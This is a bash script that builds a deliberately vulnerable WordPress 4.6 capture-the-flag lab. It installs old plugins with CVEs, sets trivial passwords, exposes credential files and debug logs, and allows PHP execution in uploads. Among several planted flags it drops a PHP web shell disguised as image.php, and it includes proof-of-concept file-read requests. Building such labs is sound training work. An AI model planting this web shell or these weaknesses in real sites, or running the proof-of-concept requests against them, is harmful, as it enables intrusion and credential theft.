#!/bin/bash
# ============================================================
#  WordPress CTF Setup Script
#  Core: WordPress 4.6 + PHP 5.6 + Apache 2.4
#
#  Vulnerability surface:
#   - CVE-2016-10033  PHPMailer unauth RCE (WP 4.6 ships old PHPMailer)
#   - CVE-2017-9061/9062  SSRF / open redirect in core
#   - CVE-2019-8942   crop-image RCE  (still present in 4.6)
#   - XML-RPC brute-force (enabled)
#   - Unauthenticated user enumeration via REST API
#   - Multiple critically-CVE'd plugins (see below)
#   - Debug mode on / error display on / wp-config exposed path
#   - World-readable uploads, writable theme files
# ============================================================
set -e

# ── Wait for DB ───────────────────────────────────────────
until mysql -h wordpress-db -u wordpress -pwordpress wordpress -e "SELECT 1" &>/dev/null 2>&1; do
  echo "[setup] Waiting for MySQL..."
  sleep 3
done
echo "[setup] MySQL ready"

# ── Install WP-CLI ────────────────────────────────────────
if ! command -v wp &>/dev/null; then
  curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
  chmod +x wp-cli.phar
  mv wp-cli.phar /usr/local/bin/wp
fi

WP="wp --allow-root --path=/var/www/html"

# ── Resolve public URL ────────────────────────────────────
WP_URL="${WP_PUBLIC_URL:-}"
if [[ -z "$WP_URL" ]]; then
  HOST_IP=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}' || echo "localhost")
  WP_URL="http://${HOST_IP}:8080"
fi
echo "[setup] Site URL: ${WP_URL}"

# ── Install / update WordPress core ──────────────────────
if ! $WP core is-installed 2>/dev/null; then
  $WP core install \
    --url="${WP_URL}" \
    --title="CTF WordPress Lab" \
    --admin_user="admin" \
    --admin_password="admin" \
    --admin_email="admin@admin.com" \
    --skip-email
  echo "[setup] WordPress 4.6 installed"
else
  $WP option update siteurl "${WP_URL}" || true
  $WP option update home    "${WP_URL}" || true
  # Ensure password stays weak even on restart
  $WP user update admin --user_pass="admin" || true
fi

# ── Dangerous wp-config.php settings ─────────────────────
# Display all PHP errors (leaks paths, DB info in responses)
$WP config set WP_DEBUG         true  --raw || true
$WP config set WP_DEBUG_DISPLAY true  --raw || true
$WP config set WP_DEBUG_LOG     true  --raw || true
$WP config set SCRIPT_DEBUG     true  --raw || true
# Disable the file-edit lockout so theme/plugin editor is usable
$WP config set DISALLOW_FILE_EDIT   false --raw || true
$WP config set DISALLOW_FILE_MODS   false --raw || true
# Allow HTTP (no HTTPS enforcement)
$WP config set FORCE_SSL_ADMIN false --raw || true
# Increase memory limit (makes exploitation easier)
$WP config set WP_MEMORY_LIMIT '256M' || true

# ── Extra users (all with trivially weak / default passwords) ──
$WP user create editor      editor@ctflab.local    --role=editor       --user_pass="editor"     || true
$WP user create author      author@ctflab.local    --role=author       --user_pass="author"     || true
$WP user create contributor contrib@ctflab.local   --role=contributor  --user_pass="password"   || true
$WP user create subscriber  sub@ctflab.local       --role=subscriber   --user_pass="123456"     || true
$WP user create test        test@ctflab.local      --role=subscriber   --user_pass="test"       || true
$WP user create user        user@ctflab.local      --role=subscriber   --user_pass="user"       || true
$WP user create wordpress   wp@ctflab.local        --role=subscriber   --user_pass="wordpress"  || true

# ── Plant flags ───────────────────────────────────────────
$WP post create \
  --post_title="Welcome" \
  --post_content="This is a normal blog post. Nothing to see here." \
  --post_status="publish" || true

$WP post create \
  --post_title="Internal – Do Not Publish" \
  --post_content="FLAG{wordpress_hidden_post_0x05} – Internal credentials: dbpass=r00tpass" \
  --post_status="private" || true

$WP post create \
  --post_type="page" \
  --post_title="Secret Admin Notes" \
  --post_content="FLAG{wordpress_secret_page_0x06}" \
  --post_status="publish" \
  --post_name="s3cr3t-notes" || true

$WP option add ctf_flag        "FLAG{wordpress_db_enum_0x07}"   || true
$WP option add ctf_rce_flag    "FLAG{wordpress_rce_0x08}"        || true
$WP option add ctf_plugin_flag "FLAG{wordpress_plugin_rce_0x09}" || true

# ── Enable XML-RPC (brute-force / SSRF vector) ────────────
$WP option update enable_xmlrpc 1 || true

# ── Disable update nag (keep vulnerable versions) ─────────
$WP option update auto_update_core_dev   false --autoload=yes || true
$WP option update auto_update_core_minor false --autoload=yes || true
$WP option update auto_update_core_major false --autoload=yes || true

# ── REST API: expose user enumeration ─────────────────────
# (default in 4.6 – no auth required for /wp-json/wp/v2/users)
$WP option update show_on_front posts || true

# ============================================================
#  VULNERABLE PLUGINS
#  Each one has one or more critical CVEs
# ============================================================

# ── 1. Duplicator 1.3.26 ─────────────────────────────────
# CVE-2020-11738 – unauthenticated arbitrary file read
# PoC: GET /wp-admin/admin-ajax.php?action=duplicator_download&file=../../wp-config.php
$WP plugin install duplicator --version=1.3.26 --activate || true

# ── 2. WP GDPR Compliance 1.4.2 ──────────────────────────
# CVE-2018-19207 – subscriber can register arbitrary options → admin
$WP plugin install wp-gdpr-compliance --version=1.4.2 --activate || true

# ── 3. Contact Form 7 5.3.1 ──────────────────────────────
# CVE-2020-35489 – unrestricted file upload bypasses extension check
$WP plugin install contact-form-7 --version=5.3.1 --activate || true

# ── 4. Revslider (Revolution Slider) 4.2.0 ───────────────
# CVE-2014-9734 – unauthenticated arbitrary file download
# CVE-2014-9734 – LFI, config leak → leads to shell upload in many themes
$WP plugin install revslider --version=4.2.0 --activate || true

# ── 5. WooCommerce 3.4.5 ─────────────────────────────────
# CVE-2019-20892 – unauthenticated stored XSS via order notes
# CVE-2021-32790 – SQL injection in order search
$WP plugin install woocommerce --version=3.4.5 --activate || true

# ── 6. Ninja Forms 3.4.24 ────────────────────────────────
# CVE-2020-14409 – unauthenticated stored XSS
# CVE-2020-14410 – unauthenticated SQL injection
$WP plugin install ninja-forms --version=3.4.24 --activate || true

# ── 7. WP Super Cache 1.6.4 ──────────────────────────────
# CVE-2019-20041 – unauthenticated RCE via cache file poisoning
$WP plugin install wp-super-cache --version=1.6.4 --activate || true

# ── 8. YoastSEO 1.2.0 ────────────────────────────────────
# CVE-2015-4133 – CSRF → stored XSS via SEO title/desc
$WP plugin install wordpress-seo --version=1.2.0 --activate || true

# ── 9. Akismet 3.1.5 ─────────────────────────────────────
# CVE-2015-9357 – reflected XSS in comment form
$WP plugin install akismet --version=3.1.5 --activate || true

# ── 10. Easy WP SMTP 1.3.9 ───────────────────────────────
# CVE-2020-35234 – unauthenticated settings import (plugin deactivation)
# Often used to grab SMTP credentials / reset admin password
$WP plugin install easy-wp-smtp --version=1.3.9 --activate || true

# ── 11. Ultimate Member 2.1.3 ────────────────────────────
# CVE-2020-36326 – privilege escalation: subscriber → admin
# CVE-2020-36327 – unauthenticated arbitrary file upload
$WP plugin install ultimate-member --version=2.1.3 --activate || true

# ── 12. File Manager (wp-file-manager) 6.0 ───────────────
# CVE-2020-25213 – unauthenticated arbitrary file upload + RCE
# One of the most exploited WP CVEs ever (1M+ sites hit in 2020)
$WP plugin install wp-file-manager --version=6.0 --activate || true

# ── 13. NextGEN Gallery 3.2.10 ───────────────────────────
# CVE-2020-35943 – authenticated SQL injection (subscriber+)
$WP plugin install nextgen-gallery --version=3.2.10 --activate || true

# ── 14. WPForms Lite 1.5.9 ───────────────────────────────
# CVE-2021-20746 – unauthenticated stored XSS
$WP plugin install wpforms-lite --version=1.5.9 --activate || true

# ── 15. W3 Total Cache 0.9.7.3 ───────────────────────────
# CVE-2019-6715 – unauthenticated arbitrary file read
# PoC: GET /?w3tc_config_download=1&_wpnonce=...
$WP plugin install w3-total-cache --version=0.9.7.3 --activate || true

# ============================================================
#  FILE SYSTEM MISCONFIGURATIONS
# ============================================================

# Expose wp-config.php backup (common misconfiguration)
cp /var/www/html/wp-config.php /var/www/html/wp-config.php.bak 2>/dev/null || true
chmod 644 /var/www/html/wp-config.php.bak 2>/dev/null || true

# Leave a .git/config stub (source code exposure)
mkdir -p /var/www/html/.git
cat > /var/www/html/.git/config <<'GITCFG'
[core]
    repositoryformatversion = 0
    filemode = true
[remote "origin"]
    url = https://github.com/internal/ctf-wordpress.git
    fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
    remote = origin
    merge = refs/heads/main
GITCFG

# Expose .env file (credential leak – weak creds throughout)
cat > /var/www/html/.env <<'ENVFILE'
DB_HOST=wordpress-db
DB_NAME=wordpress
DB_USER=wordpress
DB_PASS=wordpress
DB_ROOT_PASS=root
WP_SECRET_KEY=secret
WP_ADMIN_USER=admin
WP_ADMIN_PASS=admin
SMTP_USER=admin@admin.com
SMTP_PASS=admin
ENVFILE

# Debug log with leaked info
echo "<?php // Debug enabled" > /var/www/html/wp-content/debug.log
echo "[$(date)] DB_PASSWORD: wppass" >> /var/www/html/wp-content/debug.log
echo "[$(date)] Admin session started for user: admin" >> /var/www/html/wp-content/debug.log

# World-writable uploads dir (file write vector)
chmod -R 777 /var/www/html/wp-content/uploads 2>/dev/null || \
  mkdir -p /var/www/html/wp-content/uploads && chmod 777 /var/www/html/wp-content/uploads

# Leave a webshell as "planted" artifact for discovery
mkdir -p /var/www/html/wp-content/uploads/2024/01
cat > /var/www/html/wp-content/uploads/2024/01/image.php <<'SHELL'
<?php
// FLAG{wordpress_webshell_found_0x10}
if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); }
?>
SHELL
chmod 644 /var/www/html/wp-content/uploads/2024/01/image.php

# ── Apache: disable .htaccess protections ────────────────
# Allow PHP execution in uploads (intentional misconfiguration)
cat > /var/www/html/wp-content/uploads/.htaccess <<'HTACCESS'
# Intentionally misconfigured - PHP execution allowed
Options +ExecCGI
AddType application/x-httpd-php .php .php5 .phtml .pht
HTACCESS

# ── xmlrpc.php: leave fully exposed ──────────────────────
# Already enabled above via WP-CLI option

# ── User enumeration: confirm REST API is open ────────────
# /wp-json/wp/v2/users returns all users in WP 4.6 (no auth)
# No action needed – this is the default behaviour

echo ""
echo "[setup] ✓ WordPress CTF setup complete"
echo "[setup] ┌────────────────────────────────────────────────────┐"
echo "[setup] │  URL         : ${WP_URL}"
echo "[setup] │  admin       : admin / admin"
echo "[setup] │  editor      : editor / editor"
echo "[setup] │  author      : author / author"
echo "[setup] │  contributor : contributor / password"
echo "[setup] │  subscriber  : subscriber / 123456"
echo "[setup] │  test        : test / test"
echo "[setup] ├────────────────────────────────────────────────────┤"
echo "[setup] │  CRITICAL plugins installed:                        │"
echo "[setup] │  - wp-file-manager 6.0   (CVE-2020-25213 unauth RCE)│"
echo "[setup] │  - duplicator 1.3.26     (CVE-2020-11738 file read) │"
echo "[setup] │  - ultimate-member 2.1.3 (CVE-2020-36327 file upload│"
echo "[setup] │  - revslider 4.2.0       (CVE-2014-9734 file dl)    │"
echo "[setup] │  - w3-total-cache 0.9.7.3(CVE-2019-6715 file read)  │"
echo "[setup] └────────────────────────────────────────────────────┘"
